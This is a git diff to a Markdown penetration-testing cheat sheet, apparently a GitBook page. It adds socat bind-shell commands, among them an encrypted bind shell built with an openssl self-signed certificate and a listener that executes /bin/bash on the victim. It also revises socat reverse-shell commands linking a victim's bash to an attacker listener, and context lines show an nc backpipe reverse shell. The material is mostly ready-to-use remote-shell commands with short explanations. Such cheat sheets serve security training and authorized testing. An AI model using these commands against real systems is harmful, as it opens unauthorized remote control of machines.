@@ -12,7 +12,45 @@ TODO: description, methodology, and script prep for each section (issue [#15](ht
 * Prep all code examples for scripting (replace IPs and ports with variables, etc.)
 * Ensure code examples' variables are appropriate for their respective programming language
 
+## Bind shells
+
+Bind shells are used when the attacker connects directly to the victim.
+
+### socat
+
+```bash
+socat - TCP4:$victim_ip:$port
+```
+
+{% hint style="info" %}
+The dash `-` is required to transfer keyboard data back and forth between the machines.
+{% endhint %}
+
+#### Encrypted bind shell
+
+To create an encrypted bind shell, first a self-signed certificate must be created.
+
+```bash
+openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 365 -out bind_shell.crt
+cat bind_shell.key bind_shell.crt > bind_shell.pem
+```
+
+This command will create a new 2048-bit encryption key and certificate using the RSA algorithm.  The certificate will be valid for 365 days.  The key and certifcate information must be combined into one .pem file using `cat`. &#x20;
+
+Next, use socat to create the bind shell using this .pem certificate.  `verify=0` will be used to disable SSL verification.  Since you are using SSL on port 443 you need to run the listener with `sudo`.
+
+```bash
+#listener on victim
+sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
+#attacker client
+socat - OPENSSL:$IP:443,verify=0
+```
+
+This could also be used as a reverse shell if the client and listeners are switched.
+
 ## Reverse Shells
+
+Reverse shells are used when the attacker gets the victim machine to connect back to their machine.  Useful when firewalls or other security devices prevent bind shells.
 
 ### Reverse Shell as a Service - [https://shell.now.sh](https://shell.now.sh)
 
@@ -124,15 +162,17 @@ nc $attack_ip $port 0</var/tmp/backpipe | /bin/bash 1>/var/tmp/backpipe
 ### **Socat Reverse Shell**
 
 ```bash
-socat tcp-connect:$IP:$PORT exec:"bash -li",pty,stderr,setsid,sigint,sane
+socat tcp-connect:$IP:$port exec:"bash -li",pty,stderr,setsid,sigint,sane
 ```
 
 ```bash
-#Listener
-socat file:`tty`,raw,echo=0 tcp-listen:4444
-#Victim
-socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
+#Listener on attacker machine
+socat -d TCP-LISTEN:$port file:`tty`,raw,echo=0 
+#From victim
+socat TCP4:$IP:$port exec:'/bin/bash -li',pty,stderr,setsid,sigint,sane 
 ```
+
+`-d` increases verbosity of output
 
 ### **Golang Reverse Shell**
 
